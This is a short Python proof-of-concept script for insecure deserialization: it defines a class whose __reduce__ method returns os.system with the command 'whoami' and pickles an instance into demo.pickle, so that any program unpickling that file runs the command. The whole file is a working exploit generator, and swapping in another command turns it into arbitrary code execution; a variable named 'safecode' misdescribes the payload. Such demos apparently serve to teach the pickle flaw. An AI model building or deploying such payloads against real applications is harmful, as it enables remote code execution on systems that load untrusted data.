import pickle
import os

#exploiting the insecure deserialization
class exploit():
    def __reduce__(self):
        return (os.system,('whoami',))

  
def serialize_exploit():
           #person = {"name":"Julie","position":"senior engineer"}
           with open ("demo.pickle","wb") as wf:
               safecode = pickle.dump(exploit(),wf)
               return safecode
if __name__ == '__main__':
    safecode = serialize_exploit()
